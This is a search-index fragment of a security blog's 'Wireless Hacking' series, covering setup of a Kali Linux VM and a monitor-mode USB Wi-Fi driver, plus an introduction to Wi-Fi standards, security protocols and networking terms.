default, the network is set to NAT, which provides Internet access through your host. However, if you want the VM to be visible on your local network (useful for advanced testing), you can change it to Bridged mode and select your host interface. Finally, ensure that a USB controller (either USB 2.0 or 3.0) is present and enabled in the settings. This will be important later when attaching a USB Wi-Fi adapter. ","date":"2025-05-23","objectID":"/posts/wireless02/:5:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#configuration"},{"categories":["Guides"],"collections":["Getting Started"],"content":"29.2 Installation Now that your VM is ready, start it up. The system should boot directly into the Kali Linux ISO. On the boot menu, select “Graphical Install” to launch the graphical installer, which is easier for most users to navigate. Proceed through the installation by choosing your language, country, and keyboard layout. You’ll then configure your network settings, including a hostname (e.g., kali-vm) and an optional domain name. After that, create a user account and password. Kali now defaults to a non-root user, which improves security and mirrors real-world Linux use. For disk setup, select Guided - use entire disk, which is the simplest and safest option for a VM. Confirm your partitioning choices and let the installer complete the process. Once installation is finished, remove the ISO from the virtual CD-ROM and reboot the VM. ","date":"2025-05-23","objectID":"/posts/wireless02/:5:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#installation"},{"categories":["Guides"],"collections":["Getting Started"],"content":"29.3 Settings If you plan to use tools that require raw access to a wireless interface, such as aircrack-ng or bettercap, you’ll need to passthrough a USB Wi-Fi adapter that supports monitor mode and packet injection. The first step is to install the necessary packages that will allow Kali to build the driver for your USB Wi-Fi adapter The driver you’re installing, 8814au, is designed for Wi-Fi cards that use the Realtek RTL8814AU chipset. Before proceeding, it’s crucial to verify that your Wi-Fi card uses this chipset, as the driver will only work with compatible hardware ALFA Network RTL8814AU Linux Driver Support. To check your Wi-Fi card’s chipset, you can use the lsusb or lspci command in your terminal (depending on whether it’s a USB or PCI card). ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo apt install -y linux-headers-$(uname -r) build-essential bc dkms git libelf-dev rfkill iw Note If you encounter an error while installing the dependencies, make sure your system is up to date by running sudo apt update \u0026\u0026 sudo apt upgrade. If the issue persists, check that your Linux kernel is compatible with the linux-headers package you installed. To do this, plug your adapter into the host machine. Then, with the Kali VM powered off, open Edit Virtual Machine Settings. Click Add and choose USB Controller, then select USB Device and pick your USB Wi-Fi adapter from the list. The first task is to prepare a location on your system where the downloaded driver files will be stored. This is important to keep everything organized and ensure that the installation files are easily accessible. To create the directory, you will use the mkdir command, which stands for “make directory.” The -p flag ensures that if the directory does not already exist, it will be created. The directory we will create is called src, and it will be placed in your home directory (~/), which is a standard practice for organizing source files. After running this command, you’ll have a new folder named src in your home directory. This folder will be used specifically for storing the driver files that you will download in later steps. Now that you’re in the correct directory, it’s time to download the driver. In this case, the driver files are hosted on GitHub, a popular platform for sharing and collaborating on code. The easiest way to get the driver is by cloning the GitHub repository that contains it. To clone a repository, you use the git clone command, which will create a local copy of the repository on your system. The repository we’re using is hosted at https://github.com/morrownr/8814au.git. This repository contains the necessary files to install the driver for your device. ┌──(proxygeek㉿VMware-kali)-[~] └─$ git clone https://github.com/morrownr/8814au.git The installation process is handled by a script named install-driver.sh. Running this script will compile and install the necessary files to get the driver working on your system. There are two ways to execute the script, both of which require elevated privileges since you’re installing software that will affect system-wide settings. ┌──(proxygeek㉿VMware-kali)-[~] └─$ sudo ./install-driver.sh By following these steps, you will have successfully downloaded, installed, and configured the necessary driver for your device. Rebooting your system afterward will ensure that the installation is fully effective. Note If you are asked to choose a provider, make sure to choose the one that corresponds to your version of the Linux kernel (for example, linux510-headers for Linux kernel version 5.10). If you install the incorrect version, you’ll have to uninstall it and install the correct version. Once added, start the VM again. Inside Kali Linux, open a terminal and run: ┌──(proxygeek㉿VMware-kali)-[~] └─$ iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11b ESSID:\"\" Nickname:\"WIFI@RTL8814AU\" Mode:Monitor Frequency:2.472 GHz Access Point: Not-Associated Sensitivity:0/0 Retry:off RTS thr:off Frag","date":"2025-05-23","objectID":"/posts/wireless02/:5:3","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#settings"},{"categories":["Guides"],"collections":["Getting Started"],"content":"30 Conclusion In this second part, we have focused on setting up a secure and isolated environment to safely explore wireless hacking techniques. By preparing the necessary tools and addressing potential conflicts with networking processes, we’ve laid the groundwork for testing wireless security in a controlled manner. This is a crucial step before diving into more complex attacks and deeper exploitation of vulnerabilities. With these configurations in place, you are now ready to experiment and start using tools like Wifite for capturing traffic and testing wireless network security. The next step will take us into the world of active attacks and intrusion attempts in Part 3, where we will explore the first of many practical wireless attacks. ","date":"2025-05-23","objectID":"/posts/wireless02/:6:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 2","uri":"/posts/wireless02/#conclusion"},{"categories":["Guides"],"collections":["Getting Started"],"content":"41 About In this blog, we have introduced the basics of wireless hacking to lay the groundwork for understanding how wireless networks function and the security challenges they present. We began by discussing the fundamental concepts of WiFi, including its evolution, how it enables wireless communication, and the crucial terminology used in the realm of wireless networking. Additionally, we explored the history of WiFi—from its early days as a simple communication medium to its widespread adoption in homes, businesses, and public spaces. Understanding this evolution provides us with context for the vulnerabilities that exist in modern wireless systems today. Join us for an engaging journey that combines learning, awareness, and securing our wireless connections. Caution Ethical Hacking Reminder: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical. ","date":"2025-05-20","objectID":"/posts/wireless01/:1:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#about"},{"categories":["Guides"],"collections":["Getting Started"],"content":"42 Wireless Hacking In today’s world, Wi-Fi is ubiquitous, powering the internet connection for our devices and enabling seamless communication and access to information. But have you ever stopped to wonder how Wi-Fi actually works beneath the surface? Is it possible to manipulate wireless networks for various purposes? In this series, “Guide to Wireless Hacking,” we will explore the inner workings of Wi-Fi networks, uncover their vulnerabilities, and learn how these weaknesses can be exploited. In this first blog post, we will start with the fundamentals. We’ll explore how Wi-Fi networks operate, define essential networking terms, and take a look at the history and key characteristics of Wi-Fi technology. ","date":"2025-05-20","objectID":"/posts/wireless01/:2:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#wireless-hacking"},{"categories":["Guides"],"collections":["Getting Started"],"content":"43 What is Wi-Fi? Wi-Fi, which stands for Wireless Fidelity, is a wireless technology that enables devices to connect to the internet or communicate with each other without using physical cables. It relies on radio waves to transmit data, which allows it to function in areas where it’s not possible to run traditional cables. Wi-Fi is the primary method of internet connectivity in homes and businesses. It’s also widely available in public spaces such as cafés, libraries, and airports. ","date":"2025-05-20","objectID":"/posts/wireless01/:3:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#what-is-wi-fi"},{"categories":["Guides"],"collections":["Getting Started"],"content":"44 Key Features Feature Description Wireless Connectivity Wi-Fi eliminates the need for cables, allowing you to connect your devices wirelessly to the internet. Portability As a wireless technology, Wi-Fi enables you to easily take your devices and connect to available Wi-Fi networks wherever you go. Speed Over time, Wi-Fi speeds have steadily improved, and today’s networks can match or even surpass wired connections in terms of performance. Security Wi-Fi networks can be secured using several encryption methods, including WPA2 and WPA3, to ensure privacy and data protection. Wide Compatibility Wi-Fi is widely supported, and nearly all modern devices come with built-in Wi-Fi adapters. Range Wi-Fi coverage varies depending on the network’s frequency (2.4 GHz vs 5 GHz) and environmental factors. Generally, 2.4 GHz offers a broader range but lower speeds than 5 GHz networks. Obstacle Wi-Fi signals can travel through walls and other obstacles, but the signal strength decreases as it passes through materials. Interference Wi-Fi networks can be disrupted by other electronic devices, such as microwaves and cordless phones, causing signal degradation. Security Risks While various security protocols help protect Wi-Fi networks, no system is completely immune to hacking attempts. ","date":"2025-05-20","objectID":"/posts/wireless01/:4:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#key-features"},{"categories":["Guides"],"collections":["Getting Started"],"content":"45 The Technology Behind Wi-Fi operates based on the principles of radio wave transmission and modulation. This allows devices to communicate wirelessly and transfer data. The technology is built on the IEEE 802.11 family of standards, which outline the specifications and protocols used for wireless local area networks (WLANs). Note The IEEE (Institute of Electrical and Electronics Engineers) is an international organization that creates technical standards for various fields of engineering. ","date":"2025-05-20","objectID":"/posts/wireless01/:5:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#the-technology-behind"},{"categories":["Guides"],"collections":["Getting Started"],"content":"46 The Evolution Wi-Fi technology was developed through the combined efforts of various organizations and researchers. The IEEE 802.11 working group established the technical standards that define Wi-Fi, with input from multiple stakeholders in the industry. Key factors such as the availability of unlicensed spectrum and advancements in wireless communication technologies were instrumental in its growth. The Wi-Fi Alliance plays a pivotal role in ensuring device compatibility and managing certification programs. Over the years, Wi-Fi has evolved through several versions, including 802.11b, 802.11g, 802.11n, 802.11ac (Wi-Fi 5), and 802.11ax (Wi-Fi 6), each offering improvements in speed, coverage, and efficiency. Year Standard Data Rate Frequency Band Key Features 1997 802.11 2 Mbps 2.4 GHz Original Wi-Fi standard for basic wireless LAN communication 1999 802.11b 11 Mbps 2.4 GHz Higher data rates, widely adopted in consumer markets 1999 Wi-Fi Alliance formed - - Created to promote global Wi-Fi interoperability 2003 802.11g 54 Mbps 2.4 GHz Faster speeds, backward compatibility with 802.11b 2004 WPA - - Introduced enhanced security features to fix WEP vulnerabilities 2006 802.11n Up to 600 Mbps 2.4 GHz and 5 GHz Introduced MIMO for better range and data rates 2007 WPA2 - - Successor to WPA with stronger encryption and enhancements 2009 Wi-Fi Direct - 2.4 GHz and 5 GHz Allows device-to-device connection without an access point 2012 802.11ac (Wi-Fi 5) Up to 6.9 Gbps 5 GHz Improved performance, capacity, and speed 2013 Hotspot 2.0 - - Seamless authentication and roaming for public Wi-Fi 2019 802.11ax (Wi-Fi 6) Up to 9.6 Gbps 2.4 GHz and 5 GHz Increased efficiency, reduced latency, better network capacity 2020 Wi-Fi 6E Up to 9.6 Gbps 2.4 GHz, 5 GHz, 6 GHz Expanded Wi-Fi into the 6 GHz band for more bandwidth and less congestion ","date":"2025-05-20","objectID":"/posts/wireless01/:6:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#the-evolution"},{"categories":["Guides"],"collections":["Getting Started"],"content":"47 Wireless security Protocols Wireless security protocols are designed to protect wireless networks from unauthorized access, data breaches, and malicious activities. These protocols ensure the confidentiality, integrity, and authenticity of transmitted data. Protocol Description Encryption Used Safety Level Developed In WEP (Wired Equivalent Privacy) The first wireless security protocol, providing basic Wi-Fi encryption RC4 Low 1997 WPA (Wi-Fi Protected Access) Replacement for WEP, with stronger encryption and key management TKIP (Temporal Key Integrity Protocol) Moderate 2003 WPS (Wi-Fi Protected Setup) Simplifies device connection process, but can be vulnerable if misused Varies (Depends on WPA/WPA2) Varies 2006 WPA2 Enhanced WPA with stronger AES encryption AES (Advanced Encryption Standard) High 2004 WPA3 Latest standard, with improved encryption and security features over WPA2 SAE (Simultaneous Authentication of Equals) Very High 2018 ","date":"2025-05-20","objectID":"/posts/wireless01/:7:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#wireless-security-protocols"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48 Basic Terms ","date":"2025-05-20","objectID":"/posts/wireless01/:8:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#basic-terms"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.1 WiFi Adaptor A Wi-Fi adapter, also known as a Wi-Fi dongle or wireless network adapter, is a device that enables a computer or other devices to connect to a Wi-Fi network. It allows devices that do not have built-in Wi-Fi capabilities to access wireless networks and connect to the internet or communicate with other devices wirelessly. Note If you want to use WIFI functionality in a virtual machine, you will have to use an external WIFI adaptor and will have configure it with VMware or Virtual box. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#wifi-adaptor"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.2 AP (Access Point) AP stands for Access Point in the context of Wi-Fi. An Access Point is a device that allows Wi-Fi-enabled devices to connect to a wired network wirelessly. It acts as a central hub or gateway for wireless communication, providing a bridge between Wi-Fi devices and a wired network. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#ap-access-point"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.3 Frequency Frequency bands refer to specific ranges of radio frequencies that are used for wireless communication. Wi-Fi operates in two main frequency bands: 2.4 GHz and 5 GHz. 2.4 GHz: The 2.4 GHz band is the older and more widely used frequency band in Wi-Fi. It provides good coverage and can obstacles like walls more effectively. 5 GHz: The 5 GHz band is a newer addition to Wi-Fi and offers more available channels with wider frequency ranges. It provides faster data speeds and is less congested compared to the 2.4 GHz band since fewer devices operate in this range. However, the 5 GHz signals have a shorter range and may encounter more attenuation when passing through walls and other obstacles. { color: ['#00BFFF', '#FF7F50'], title: { text: 'Wi-Fi Frequency Bands Overview', top: '2%', left: 'center' }, tooltip: { trigger: 'axis', axisPointer: { type: 'shadow', label: { backgroundColor: '#6a7985' } }, formatter: function(params) { const defs = { \"Coverage\": \"Area where the Wi-Fi signal can be effectively received.\", \"Channels\": \"Number of available channels for data transmission.\", \"Speed\": \"Maximum theoretical data transmission speed.\", \"Obstacle\": \"Ability of the signal to pass through walls and obstacles.\", \"Congestion\": \"Level of interference caused by other devices.\", \"Connectivity\": \"Ease of connection without physical cables.\", \"Portability\": \"Ability to use Wi-Fi on mobile and portable devices.\", \"Security\": \"Level of data protection on the network (WPA2/WPA3).\", \"Compatibility\": \"Number of devices supporting this frequency band.\", \"Range\": \"Maximum distance at which the signal is usable.\", \"Interference\": \"Disturbances caused by other electronic devices.\" }; let category = params[0].axisValue; let tooltipText = `\u003cb\u003e${category}\u003c/b\u003e\u003cbr\u003e${defs[category]}\u003cbr\u003e\u003cbr\u003e`; params.forEach(item =\u003e { tooltipText += `${item.marker} ${item.seriesName}: ${item.data}\u003cbr\u003e`; }); return tooltipText; } }, legend: { data: ['2.4 GHz', '5 GHz'], top: '10%' }, toolbox: { feature: { saveAsImage: {} } }, grid: { left: '5%', right: '5%', bottom: '10%', top: '20%', containLabel: true }, xAxis: { type: 'category', data: [ \"Coverage\", \"Channels\", \"Speed\", \"Obstacle\", \"Congestion\", \"Connectivity\", \"Portability\", \"Security\", \"Compatibility\", \"Range\", \"Interference\" ], axisLine: { lineStyle: { color: '#888' } }, axisTick: { alignWithLabel: true } }, yAxis: { type: 'value', max: 10, axisLine: { lineStyle: { color: '#888' } }, splitLine: { lineStyle: { type: 'dashed', color: '#ddd' } } }, series: [ { name: '2.4 GHz', type: 'bar', barGap: 0, barCategoryGap: '40%', emphasis: { focus: 'series' }, data: [9, 3, 5, 8, 7, 10, 10, 7, 10, 9, 6], itemStyle: { color: 'rgb(0, 191, 255)' } }, { name: '5 GHz', type: 'bar', emphasis: { focus: 'series' }, data: [6, 9, 9, 5, 3, 10, 10, 9, 10, 6, 4], itemStyle: { color: 'rgb(255, 127, 80)' } } ] }","date":"2025-05-20","objectID":"/posts/wireless01/:8:3","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#frequency"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.4 Channels Channels refer to specific frequencies within the wireless spectrum that are used for transmitting and receiving data. Wi-Fi channels are divided to reduce interference and allow multiple networks to operate in close proximity without conflicting with each other. Note Each frequency band is divided into multiple channels, represented by numbers. For example, in the 2.4 GHz band, there are 11 channels available, usually numbered from 1 to 11. In the 5 GHz band, there are typically more channels available, such as 24 or more. Channels in the 2.4 GHz band have a narrower frequency range and can partially overlap with each other. This means that neighboring Wi-Fi networks using nearby channels may experience interference, which can degrade the performance of both networks. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:4","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#channels"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.5 ESSID ESSID stands for Extended Service Set Identifier. It is the name assigned to a Wi-Fi network. The ESSID acts as a unique identifier that allows devices to differentiate between different wireless networks in the vicinity. When you search for available Wi-Fi networks on your device, you see a list of ESSIDs to choose from. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:5","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#essid"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.6 BSSID BSSID stands for Basic Service Set Identifier. It is a unique identifier assigned to each wireless access point (AP) in a Wi-Fi network. Each access point in a Wi-Fi network has its own MAC (Media Access Control) address, which is a unique identifier assigned to the network interface of the device. The BSSID is derived from the MAC address of the access point. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:6","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#bssid"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.7 Bandwidth Bandwidth in Wi-Fi refers to the maximum data transfer rate or capacity of a wireless network. It represents the amount of data that can be transmitted over the network within a given time frame. Measured in Gigabits per second (Gbps) or Megabits per second (Mbps). ","date":"2025-05-20","objectID":"/posts/wireless01/:8:7","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#bandwidth"},{"categories":["Guides"],"collections":["Getting Started"],"content":"48.8 Key/Passphrase A key refers to a cryptographic code or password used for authentication and encryption purposes to secure a wireless network There are two keys when working with WIFI : Network Security Key: Also known as a Wi-Fi password or passphrase, the network security key is used to authenticate a client device and grant access to the Wi-Fi network. When connecting to a secured Wi-Fi network, users are typically prompted to enter the network security key to prove their authorization. This key is used during the authentication phase of the Wi-Fi handshake process to establish a secure connection. Encryption Key: Once a client device is authenticated and connected to a Wi-Fi network, an encryption key is used to encrypt and decrypt the data transmitted over the network. This key ensures that the data exchanged between the client and the access point is secure and cannot be intercepted or understood by unauthorized parties. Different encryption protocols, such as WPA2 or WPA3, use different encryption keys and algorithms to protect the confidentiality and integrity of the Wi-Fi communication. ","date":"2025-05-20","objectID":"/posts/wireless01/:8:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#keypassphrase"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49 Some Neccessary Networking Concepts ","date":"2025-05-20","objectID":"/posts/wireless01/:9:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#some-neccessary-networking-concepts"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.1 MAC Address A MAC address (Media Access Control address) is a unique identifier assigned to network interfaces, such as network cards or Ethernet ports. It is a 48-bit (6-byte) value expressed in hexadecimal format, typically written in pairs separated by colons or hyphens. Example: 00:1A:2B:3C:4D:5E — the first half is the Organizationally Unique Identifier (OUI) (identifies the manufacturer), and the second half is the device-specific identifier. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#mac-address"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.2 ARP ARP stands for Address Resolution Protocol. It is used in networks to map an IP address to a MAC address. When a device wants to communicate with another on the same network, it uses ARP to find the MAC address of the destination by sending an ARP request. sequenceDiagram participant PC1 as PC1 (Requester) participant Network as Network (Broadcast) participant PC2 as PC2 (Responder) PC1-\u003e\u003eNetwork: ARP Request (Who has IP 192.168.1.2?) Note over Network: Broadcast message to all devices Network-\u003e\u003ePC2: ARP Request PC2-\u003e\u003eNetwork: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55) Network-\u003e\u003ePC1: ARP Reply PC1-\u003e\u003ePC2: Direct communication using found MAC address sequenceDiagram participant PC1 as PC1 (Requester) participant Network as Network (Broadcast) participant PC2 as PC2 (Responder) PC1-\u003e\u003eNetwork: ARP Request (Who has IP 192.168.1.2?) Note over Network: Broadcast message to all devices Network-\u003e\u003ePC2: ARP Request PC2-\u003e\u003eNetwork: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55) Network-\u003e\u003ePC1: ARP Reply PC1-\u003e\u003ePC2: Direct communication using found MAC address sequenceDiagram participant PC1 as PC1 (Requester) participant Network as Network (Broadcast) participant PC2 as PC2 (Responder) PC1-\u003e\u003eNetwork: ARP Request (Who has IP 192.168.1.2?) Note over Network: Broadcast message to all devices Network-\u003e\u003ePC2: ARP Request PC2-\u003e\u003eNetwork: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55) Network-\u003e\u003ePC1: ARP Reply PC1-\u003e\u003ePC2: Direct communication using found MAC address sequenceDiagram participant PC1 as PC1 (Requester) participant Network as Network (Broadcast) participant PC2 as PC2 (Responder) PC1-\u003e\u003eNetwork: ARP Request (Who has IP 192.168.1.2?) Note over Network: Broadcast message to all devices Network-\u003e\u003ePC2: ARP Request PC2-\u003e\u003eNetwork: ARP Reply (The MAC address for 192.168.1.2 is 00:11:22:33:44:55) Network-\u003e\u003ePC1: ARP Reply PC1-\u003e\u003ePC2: Direct communication using found MAC address ","date":"2025-05-20","objectID":"/posts/wireless01/:9:2","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#arp"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.3 IP Address An IP address (Internet Protocol address) is a numerical label assigned to each device connected to a network. It serves as a unique identifier, allowing devices to send and receive data over the internet or a private network. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:3","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#ip-address"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.4 Gateway A gateway is a device or system that serves as an entry point between different networks. It forwards data packets based on their destination and enables communication between networks. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:4","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#gateway"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.5 Router A router is a networking device that connects multiple networks and routes traffic between them. It acts as a central hub and makes decisions based on the destination address of data packets. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:5","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#router"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.6 Subnet A subnet (subnetwork) is a logical division of an IP network. Subnetting improves network performance, security, and organization by separating broadcast domains. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:6","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#subnet"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.7 DHCP DHCP (Dynamic Host Configuration Protocol) is responsible for automatically assigning IP addresses and other network settings to devices on a network. sequenceDiagram participant Client as Client (Device) participant Network as Network (Broadcast) participant DHCPServer as DHCP Server Client-\u003e\u003eNetwork: DHCP Discover (Looking for DHCP server) Network-\u003e\u003eDHCPServer: DHCP Discover DHCPServer-\u003e\u003eNetwork: DHCP Offer (IP address + config) Network-\u003e\u003eClient: DHCP Offer Client-\u003e\u003eNetwork: DHCP Request (Requesting offered IP) Network-\u003e\u003eDHCPServer: DHCP Request DHCPServer-\u003e\u003eNetwork: DHCP Acknowledgment (Confirm IP assigned) Network-\u003e\u003eClient: DHCP Acknowledgment Client-\u003e\u003eDHCPServer: Communication with assigned IP sequenceDiagram participant Client as Client (Device) participant Network as Network (Broadcast) participant DHCPServer as DHCP Server Client-\u003e\u003eNetwork: DHCP Discover (Looking for DHCP server) Network-\u003e\u003eDHCPServer: DHCP Discover DHCPServer-\u003e\u003eNetwork: DHCP Offer (IP address + config) Network-\u003e\u003eClient: DHCP Offer Client-\u003e\u003eNetwork: DHCP Request (Requesting offered IP) Network-\u003e\u003eDHCPServer: DHCP Request DHCPServer-\u003e\u003eNetwork: DHCP Acknowledgment (Confirm IP assigned) Network-\u003e\u003eClient: DHCP Acknowledgment Client-\u003e\u003eDHCPServer: Communication with assigned IP sequenceDiagram participant Client as Client (Device) participant Network as Network (Broadcast) participant DHCPServer as DHCP Server Client-\u003e\u003eNetwork: DHCP Discover (Looking for DHCP server) Network-\u003e\u003eDHCPServer: DHCP Discover DHCPServer-\u003e\u003eNetwork: DHCP Offer (IP address + config) Network-\u003e\u003eClient: DHCP Offer Client-\u003e\u003eNetwork: DHCP Request (Requesting offered IP) Network-\u003e\u003eDHCPServer: DHCP Request DHCPServer-\u003e\u003eNetwork: DHCP Acknowledgment (Confirm IP assigned) Network-\u003e\u003eClient: DHCP Acknowledgment Client-\u003e\u003eDHCPServer: Communication with assigned IP sequenceDiagram participant Client as Client (Device) participant Network as Network (Broadcast) participant DHCPServer as DHCP Server Client-\u003e\u003eNetwork: DHCP Discover (Looking for DHCP server) Network-\u003e\u003eDHCPServer: DHCP Discover DHCPServer-\u003e\u003eNetwork: DHCP Offer (IP address + config) Network-\u003e\u003eClient: DHCP Offer Client-\u003e\u003eNetwork: DHCP Request (Requesting offered IP) Network-\u003e\u003eDHCPServer: DHCP Request DHCPServer-\u003e\u003eNetwork: DHCP Acknowledgment (Confirm IP assigned) Network-\u003e\u003eClient: DHCP Acknowledgment Client-\u003e\u003eDHCPServer: Communication with assigned IP ","date":"2025-05-20","objectID":"/posts/wireless01/:9:7","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#dhcp"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#working-of-wifi"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#determining-the-gateway"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. 